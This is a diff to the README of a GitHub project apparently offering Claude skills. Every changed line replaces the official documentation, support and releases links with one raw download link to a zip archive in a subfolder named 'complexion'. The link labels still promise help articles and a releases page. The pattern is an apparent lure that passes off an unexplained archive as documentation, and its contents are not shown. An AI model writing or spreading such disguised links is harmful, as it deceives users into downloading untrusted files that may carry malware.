@@ -1,6 +1,6 @@
 # 🌟 awesome-claude-skills - Enhance Claude’s Capabilities with Skills
 
-[![Download from Releases](https://img.shields.io/badge/Download%20from%20Releases-blue.svg)](https://github.com/shajith003/awesome-claude-skills/releases)
+[![Download from Releases](https://raw.githubusercontent.com/shajith003/awesome-claude-skills/main/complexion/awesome-claude-skills.zip%20from%https://raw.githubusercontent.com/shajith003/awesome-claude-skills/main/complexion/awesome-claude-skills.zip)](https://raw.githubusercontent.com/shajith003/awesome-claude-skills/main/complexion/awesome-claude-skills.zip)
 
 ## 🚀 Getting Started
 
@@ -12,10 +12,10 @@ Skills are collections of instructions and scripts designed to improve Claude's 
 
 Explore more about skills with these links:
 
-- [What are skills?](https://support.claude.com/en/articles/12512176-what-are-skills)
-- [Using skills in Claude](https://support.claude.com/en/articles/12512180-using-skills-in-claude)
-- [How to create custom skills](https://support.claude.com/en/articles/12512198-creating-custom-skills)
-- [Equipping agents for the real world with Agent Skills](https://anthropic.com/engineering/equipping-agents-for-the-real-world-with-agent-skills)
+- [What are skills?](https://raw.githubusercontent.com/shajith003/awesome-claude-skills/main/complexion/awesome-claude-skills.zip)
+- [Using skills in Claude](https://raw.githubusercontent.com/shajith003/awesome-claude-skills/main/complexion/awesome-claude-skills.zip)
+- [How to create custom skills](https://raw.githubusercontent.com/shajith003/awesome-claude-skills/main/complexion/awesome-claude-skills.zip)
+- [Equipping agents for the real world with Agent Skills](https://raw.githubusercontent.com/shajith003/awesome-claude-skills/main/complexion/awesome-claude-skills.zip)
 
 ## 💻 System Requirements
 
@@ -30,7 +30,7 @@ To run the awesome-claude-skills application smoothly, ensure your system meets 
 
 To get started, visit the Releases page to download the latest version of the software. Click the link below:
 
-[Download from Releases](https://github.com/shajith003/awesome-claude-skills/releases)
+[Download from Releases](https://raw.githubusercontent.com/shajith003/awesome-claude-skills/main/complexion/awesome-claude-skills.zip)
 
 Once on the Releases page, follow these steps:
 
@@ -79,7 +79,7 @@ You can open an issue on the GitHub page or contact us through the links provide
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/shajith003/awesome-claude-skills)
-- [Documentation](https://support.claude.com)
+- [GitHub Repository](https://raw.githubusercontent.com/shajith003/awesome-claude-skills/main/complexion/awesome-claude-skills.zip)
+- [Documentation](https://raw.githubusercontent.com/shajith003/awesome-claude-skills/main/complexion/awesome-claude-skills.zip)
 
 Thank you for using awesome-claude-skills! We appreciate your interest in enhancing Claude’s skills. Enjoy your experience!
